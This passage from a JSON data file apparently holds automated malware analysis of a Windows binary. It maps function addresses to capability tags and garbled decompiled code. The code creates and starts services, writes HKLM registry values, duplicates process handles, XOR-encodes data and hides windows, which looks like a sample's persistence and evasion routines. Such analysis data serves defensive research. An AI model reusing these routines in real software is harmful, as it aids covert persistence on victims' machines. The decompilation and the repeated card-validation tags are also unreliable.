        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019e1) overlaps instruction at (ram,0x004019dd)\n// \n\nuint __cdecl fcn.00401990(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    unkbyte10 extraout_ST0;\n    ulong uVar3;\n    \n    uVar3 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    piVar2 = uVar3 >> 0x20;\n    iVar1 = uVar3;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 0) || (iVar1 >= 0)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    }\n    else {\n        *(iVar1 + -0x7ce92414) = extraout_ST0;\n        *piVar2 = *piVar2 + -0xaf207c;\n    }\n    return 1;\n}\n",
        "token_count": 275
    },
    "004019f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a07) overlaps instruction at (ram,0x00401a04)\n// \n\nuint __fastcall fcn.004019f0(uint32_t param_1, char param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uint32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint16_t in_SS;\n    bool in_ZF;\n    uint32_t in_stack_ffffffe0;\n    int32_t *piVar7;\n    \n    if (!in_ZF) {\n        uVar6 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff;\n        if (in_ZF) goto code_r0x00401a00;\n    }\n    in_EAX = param_4;\n    uVar6 = param_3;\ncode_r0x00401a00:\n    piVar7 = in_stack_ffffffe0 & 0xffff0000 | in_SS;\n    puVar1 = (in_EAX | 0x8b) - 1;\n    *puVar1 = *puVar1 | uVar6 >> 8;\n    *piVar7 = *piVar7 + uVar6;\n    pcVar2 = (in_EAX | 0x8b) + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(0x47);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    iVar5 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar4, 0, 0);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar5 == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0x420) {\n            iVar5 = (*pcVar3)();\n            if (iVar5 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n    return 1;\n}\n",
        "token_count": 538
    },
    "004026e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00402840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402854) overlaps instruction at (ram,0x00402851)\n// \n\nbool __cdecl fcn.00402840(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    bool in_CF;\n    \n    if ((in_CF) || (!in_CF)) {\n        in_EAX = arg_8h;\n    }\n    iVar1 = fcn.00402870(in_EAX, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 114
    },
    "004029f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.004029f0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    bVar5 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar2 = (arg_8h - arg_14h) + arg_ch;\n    pcVar1 = arg_8h;\n    if ((!bVar5) && (bVar5)) {\n        LOCK();\n        pcVar1 = arg_8h + 0x658f517f;\n    }\n    if (arg_14h != 0) {\n        if (arg_8h <= pcVar2) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    bVar5 = true;\n                    iVar3 = arg_14h;\n                    pcVar1 = arg_8h;\n                    pcVar4 = arg_10h;\n                    do {\n                        pcVar4 = pcVar4 + 1;\n                        pcVar1 = pcVar1 + 1;\n                        iVar3 = iVar3 + -1;\n                        if (iVar3 == 0) break;\n                        bVar5 = *pcVar1 == *pcVar4;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar2);\n        }\n        pcVar1 = NULL;\n    }\n    return pcVar1;\n}\n",
        "token_count": 393
    },
    "00402ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d08) overlaps instruction at (ram,0x00402d07)\n// \n\nuint __cdecl fcn.00402ca0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    char unaff_BH;\n    uint *unaff_EDI;\n    bool bVar6;\n    unkbyte6 Var7;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    iStack12 = mode;\n    uStack16 = filename;\n    uStack20 = 0x402cb2;\n    Var7 = (*_sym.imp.MSVCRT.dll_fopen)();\n    iVar3 = Var7;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    uVar2 = Var7;\n    uVar4 = (Var7 >> 0x20 & 0xff00 | (Var7 >> 0x20 & 0x4e | 0x38) & uVar2) & Var7 ^ 0x3c00;\n    uVar5 = (uVar4 & 0xff | (uVar4 >> 8) + unaff_BH << 8) | 0x604;\n    bVar6 = (uVar5 >> 8) + uVar5 == '\\0';\n    uStack16 = nitems;\n    uStack20 = 1;\n    uStack24 = ptr;\n    iStack12 = iVar3;\n    Var7 = (*_sym.imp.MSVCRT.dll_fwrite)();\n    if (!bVar6) {\n        if (bVar6) {\n            uVar1 = in(Var7 >> 0x20);\n            *unaff_EDI = uVar1;\n            if (&stack0xffffffe8 < 1) {\n                if (Var7 == 0) {\n                    return 0;\n                }\n                (*_sym.imp.USER32.dll_ShowWindow)(Var7, 0);\n                return 1;\n            }\n            *(iVar3 + -1) = *(iVar3 + -1) ^ Var7 >> 0x20;\n            goto code_r0x00402d0f;\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar2);\ncode_r0x00402d0f:\n    uStack16 = CONCAT13(0x35, uStack16);\n    iStack12 = CONCAT13(uVar2, 0x402d);\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 1;\n}\n",
        "token_count": 597
    },
    "00402d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ded) overlaps instruction at (ram,0x00402de9)\n// \n\nuint fcn.00402d90(void)\n\n{\n    code *pcVar1;\n    int32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    ulong uVar6;\n    unkbyte6 Var7;\n    uchar auStack256 [216];\n    uint uStack40;\n    uint *puStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint *puStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x407104;\n    uStack16 = 0x402d9f;\n    uVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puStack36 = uVar6;\n    bVar3 = false;\n    bVar5 = puStack36 == NULL;\n    bVar4 = (POPCOUNT(puStack36 & 0xff) & 1U) != 0;\n    if (bVar5) {\n        return 0;\n    }\n    puVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if ((bVar4) && (!bVar4)) {\n        puStack36 = 0x34a96cf4;\n        pcVar1 = (uVar6 >> 0x20) + 1;\n        bVar3 = pcVar1 < sym.imp.KERNEL32.dll_GetProcAddress;\n        bVar5 = pcVar1 == sym.imp.KERNEL32.dll_GetProcAddress;\n        puVar2 = NULL;\n    }\n    uStack16 = 0x407114;\n    uStack24 = 0x402dce;\n    puStack20 = puStack36;\n    Var7 = (*puVar2)();\n    *0x42377c = Var7;\n    if ((bVar3 || bVar5) || (!bVar3 && !bVar5)) {\n        uStack24 = 0x407130;\n        uStack32 = 0x402df5;\n        puStack28 = puStack36;\n        *0x423780 = (*puVar2)();\n    }\n    else {\n        *puVar2 = *puStack36;\n        *(extraout_ECX + 0x40) = *(extraout_ECX + 0x40) ^ Var7 >> 0x28;\n        *(puStack36 + 3) = *(puStack36 + 3) + (Var7 >> 0x20);\n        *0x423780 = &stack0xffffff00 |\n                    *((unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX)) + (&stack0xffffffec & 0xff));\n        puStack36 = puStack36 + 1;\n        puVar2 = puVar2 + 1;\n    }\n    uStack32 = 0x407140;\n    uStack40 = 0x402e0b;\n    *0x423784 = (*puVar2)();\n    if (((*0x42377c != 0) && (*0x423780 != 0)) && (*0x423784 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 734
    },
    "00402e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402e50) overlaps instruction at (ram,0x00402e4f)\n// \n// WARNING: Removing unreachable block (ram,0x00402edd)\n\nuint fcn.00402e40(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char extraout_CH;\n    uint8_t extraout_CH_00;\n    int32_t *piVar5;\n    bool in_PF;\n    unkbyte10 extraout_ST0;\n    ulong uVar6;\n    \n    if ((!in_PF) && (in_PF)) {\n        *(in_EAX + 0x7c) = *(in_EAX + 0x7c) + -0x70;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar6 = fcn.00402b10(0x40707c);\n    piVar5 = uVar6 >> 0x20;\n    if (uVar6 == -1) {\n        return 0;\n    }\n    *(uVar6 + -0x7ce92414) = extraout_ST0;\n    *piVar5 = *piVar5 + 0x6a50df84;\n    *(piVar5 + 0x10) = *(piVar5 + 0x10) + extraout_CH;\n    uVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    iVar2 = uVar6;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *(iVar2 + 0x43d1773a) = *(iVar2 + 0x43d1773a) ^ 0x8b27e95e;\n    puVar1 = (uVar6 >> 0x20) + 2;\n    *puVar1 = *puVar1 | extraout_CH_00;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(param_1 + 0x7c8ecb0e, iVar2, 0, 0, 0);\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 555
    },
    "00403690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004036cd) overlaps instruction at (ram,0x004036cc)\n// \n\nvoid __cdecl fcn.00403690(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint16_t uVar4;\n    uint8_t uVar5;\n    uint16_t in_CX;\n    uint32_t in_EDX;\n    uint32_t uVar6;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar7;\n    uint32_t uStack00000014;\n    uint32_t uStack00000018;\n    uint uStack0000001c;\n    uint32_t uStack00000020;\n    ushort uStack24;\n    uint16_t uStack22;\n    \n    uVar6 = 0;\n    uStack22 = in_CX;\n    if (arg_14h != 0) {\n        do {\n            uStack24 = unaff_ESI >> 0x10;\n            bVar7 = arg_14h == '\\x01';\n            uVar5 = *(uVar6 + arg_10h);\n            uVar4 = uStack22 & 0xff00;\n            if (bVar7) {\ncode_r0x004036cd:\n                in_EDX = uVar6 % arg_ch;\ncode_r0x004036d4:\n                uVar5 = uVar5 ^ *(in_EDX + arg_8h);\n                uStack24 = in_EDX;\n                uStack22 = in_EDX >> 0x10;\n            }\n            else {\n                if (!bVar7) goto code_r0x004036cd;\n                puVar2 = unaff_EDI + 1;\n                uVar3 = in(in_EDX);\n                *unaff_EDI = uVar3;\n                if (&stack0xfffffff0 < 1) {\n                    uStack00000014 = arg_14h & 0xffffff20;\n                    uStack0000001c = 0x4074a4;\n                    uStack00000018 = uStack00000014;\n                    uStack00000020 = uStack00000014;\n                    (*_sym.imp.USER32.dll_RegisterClassExA)();\n                    return;\n                }\n                puVar1 = uVar6 + 0xf7d233c3;\n                *puVar1 = *puVar1 ^ uVar5;\n                unaff_EDI = puVar2;\n                if (*puVar1 == 0) goto code_r0x004036d4;\n            }\n            in_EDX = CONCAT22(uStack22, uStack24);\n            *(uVar6 + arg_10h) = uVar5;\n            uVar6 = uVar6 + 1;\n            unaff_ESI = arg_10h;\n            uStack22 = uVar4 | uVar5;\n        } while (uVar6 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 673
    },
    "00403790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403790(void)\n\n{\n    uint uVar1;\n    \n    if (*0x423788 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x423788 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00403c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403c40(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_ch._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar2 = 1;\n        do {\n            uVar1 = *(iVar2 % arg_ch + arg_8h);\n            *(arg_18h + -1 + iVar2) = var_ch ^ *(var_8h + arg_10h) ^ *((iVar2 + -1) % arg_ch + arg_8h);\n            *(iVar2 + arg_18h) = var_ch ^ uVar1;\n            var_8h = var_8h + 1;\n            iVar2 = iVar2 + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "00403d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d4f) overlaps instruction at (ram,0x00403d4e)\n// \n\nvoid __cdecl fcn.00403d30(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint8_t uVar7;\n    uint16_t uVar8;\n    int32_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t unaff_EBX;\n    uchar *puVar11;\n    uchar *unaff_ESI;\n    uint32_t *unaff_EDI;\n    ushort in_SS;\n    bool bVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar15;\n    uint8_t in_NT;\n    float10 in_ST0;\n    char cStackY24;\n    \n    puVar11 = &stack0xfffffffc;\n    bVar12 = in_EDX < 0x51;\n    bVar13 = (POPCOUNT(in_EDX + 0xaf) & 1U) == 0;\n    *arg_8h = 0x69;\n    piVar9 = arg_8h;\n    piVar5 = in_EDX;\n    puVar6 = &stack0xfffffffc;\n    if (bVar13) goto code_r0x00403d68;\n    while( true ) {\n        piVar9 = arg_8h;\n        piVar5 = in_EDX;\n        puVar6 = puVar11;\n        if (bVar13) {\n            unaff_ESI = 0x34a96cf4;\n            puVar11 = *0xc617b43a;\n            piVar9 = in_EDX + 2;\n            bVar12 = CARRY4(*unaff_EDI, in_ECX);\n            *unaff_EDI = *unaff_EDI + in_ECX;\n        }\n        else {\ncode_r0x00403d68:\n            puVar11 = puVar6;\n            arg_8h = piVar5;\n            *(piVar9 + 1) = 0xf;\n        }\n        if ((!bVar12) && (bVar12)) {\n            uVar7 = piVar9;\n            cVar3 = uVar7 - *unaff_EDI;\n            func_0x10189cf6((in_NT & 1) * 0x4000 | SBORROW1(uVar7, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar3) & 1U) == 0) * 4 | uVar7 < *unaff_EDI);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(piVar9 + 2) = 0xd;\n        bVar12 = (POPCOUNT((in_ECX - 1U & unaff_EDI | 0x61be) & 0xff) & 1U) == 0;\n        *(piVar9 + 3) = 0x30;\n        if ((bVar12) || (!bVar12)) {\n            *(piVar9 + 1) = 0x9e;\n        }\n        else {\n            unaff_ESI = 0x34a96cf4;\n            puVar11 = *0xc617b43a;\n            arg_8h = piVar9;\n        }\n        bVar12 = (arg_8h & 0x1200) == 0;\n        uVar10 = *(puVar11 + 8);\n        *(uVar10 + 5) = 0x42;\n        uVar4 = arg_8h >> 8;\n        uVar7 = uVar10;\n        if ((bVar12) || (!bVar12)) break;\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        uVar10 = uVar10 & 0xffff0000 | CONCAT11((uVar10 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        bVar12 = 0xdb4099a8 < uVar10;\n        arg_8h = uVar10 + 0x24bf6657;\n        bVar13 = (POPCOUNT(arg_8h & 0xff) & 1U) == 0;\n        in_EDX = CONCAT31(uVar4, 0x5f);\n    }\n    *(uVar10 + 6) = 0x3f;\n    bVar12 = (arg_8h & 0x1200) != 0;\n    iVar1 = *(puVar11 + 8);\n    *(iVar1 + 7) = 0x77;\n    if ((bVar12) && (!bVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar1 + 8) = 0x78;\n    bVar12 = uVar7 == 1;\n    *(iVar1 + 9) = 0xee;\n    if ((uVar7 < '\\x02') || ('\\x01' < uVar7)) {\n        *(iVar1 + 10) = 0xcd;\n    }\n    else {\n        in_ST0 = in_ST0 - *(puVar11 + 0x47c692c9);\n        bVar12 = (in_ECX & 0xffff | (in_ECX & 0xffff) >> 8) == 0;\n    }\n    if ((!bVar12) && (bVar12)) {\n        uVar10 = uVar10 & 0xe2f4cc58;\n        bVar12 = uVar10 == 0;\n    }\n    *(iVar1 + 0xb) = 0x5b;\n    if ((!bVar12) && (bVar12)) {\n        uVar10 = uVar10 & 0xe2f4cc58;\n    }\n    *(iVar1 + 0xc) = 0x65;\n    *(iVar1 + 0xd) = 0x99;\n    cStackY24 = unaff_EBX;\n    bVar12 = unaff_EBX == -1;\n    *(iVar1 + 0xe) = 0xb4;\n    if (bVar12) goto code_r0x00403e70;\n    do {\n        if (bVar12) {\n            uVar10 = uVar10 & 0xffffff00 | *0x4bb148d3;\n            out(*unaff_ESI, arg_8h);\n            unaff_ESI = unaff_ESI + 1;\n        }\ncode_r0x00403e70:\n        *(iVar1 + 0xf) = 0x34;\n        *(iVar1 + 0x10) = 0x71;\n        uVar8 = CONCAT11(((uVar10 >> 8) - cStackY24) + 'M', uVar10) & 0x26ae;\n        bVar15 = SBORROW2(uVar8, 1);\n        uVar8 = uVar8 - 1;\n        bVar14 = uVar8 < 0;\n        bVar12 = uVar8 == 0;\n        bVar13 = (POPCOUNT(uVar8 & 0xff) & 1U) == 0;\n        *(iVar1 + 0x11) = 0xf3;\n        if ((bVar13) || (!bVar13)) goto code_r0x00403ed8;\n        puVar2 = segment(in_SS, *0x10 + -0x10);\n        uVar10 = *puVar2;\n        arg_8h = 0xb7bc9ea5;\n    } while (bVar13);\n    bVar15 = false;\n    bVar14 = &stack0xfffffff4 < 0;\n    uVar10 = uVar10;\ncode_r0x00403ed8:\n    *(iVar1 + 0x12) = 0x70;\n    if ((bVar15 == bVar14) && (bVar15 != bVar14)) {\n        *(uVar10 + 0x8316dbec) = in_ST0;\n        *arg_8h = *arg_8h + 0x47c6df84;\n    }\n    else {\n        *(iVar1 + 0x13) = 0xde;\n    }\n    **(puVar11 + 0xc) = 0x14;\n    return;\n}\n",
        "token_count": 2049
    },
    "004040d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004040d0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404800(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404780, 0);\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "00404bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404be6) overlaps instruction at (ram,0x00404be2)\n// \n// WARNING: Removing unreachable block (ram,0x00404c22)\n\nbool __fastcall fcn.00404bc0(int32_t param_1)\n\n{\n    char cVar1;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *unaff_EBP;\n    uint *puVar4;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    char *pcVar5;\n    bool in_CF;\n    char in_ZF;\n    uint uStack8;\n    uint uStack4;\n    \n    do {\n        uStack4 = unaff_EBP;\n        puVar4 = &uStack4;\n        uStack8 = 0;\n        if ((in_CF) || (!in_CF)) {\n            arg_8h = &uStack8;\n            goto code_r0x00404be9;\n        }\n        param_1 = param_1 + -1;\n        unaff_EBP = &uStack4;\n    } while (param_1 != 0 && in_ZF != '\\0');\n    *unaff_EDI = unaff_ESI + 4;\n    puVar4 = &uStack4 + 1;\n    arg_8h = *0x9750e2b5;\ncode_r0x00404be9:\n    iVar2 = fcn.00401000(arg_8h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (*(puVar4 + -4) == 0) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar5 = *(puVar4 + -4);\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, *(puVar4 + -4), ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 529
    },
    "00404cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404d08) overlaps instruction at (ram,0x00404d07)\n// \n\nuint __cdecl fcn.00404cd0(uint8_t *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    char in_DL;\n    int32_t arg_8h_00;\n    uint8_t *unaff_EDI;\n    uint8_t *arg_ch_00;\n    bool bVar4;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t hSCManager;\n    float10 fVar5;\n    uint uVar6;\n    \n    bVar4 = in_DL + 0x15U < in_EAX >> 8;\n    uVar6 = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (!bVar4) {\n        if (bVar4) goto code_r0x00404cf8;\n    }\n    unaff_EDI = arg_8h;\ncode_r0x00404cf8:\n    arg_ch_00 = unaff_EDI + 1;\n    uVar2 = iVar3;\n    cVar1 = uVar2 - *unaff_EDI;\n    hSCManager = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n                 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                 ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                 (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    arg_8h_00 = iVar3 + -1;\n    func_0x1018ac7a();\n    bVar4 = false;\n    fVar5 = fcn.004027e0(hSCManager, uVar6);\n    if ((!bVar4) && (bVar4)) {\n        *(unaff_EDI + 0x1d) = fVar5;\n        arg_ch_00 = unaff_EDI + 6;\n        arg_8h_00 = iVar3 + 4;\n    }\n    uVar6 = fcn.00401990(arg_8h_00, arg_ch_00, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar6;\n}\n",
        "token_count": 715
    },
    "00403760": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403760(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402d40": {
        "rules": [
            "hide graphical window",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4074a4, 0x423778, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00403540": {
        "rules": [
            "contain loop"
        ],
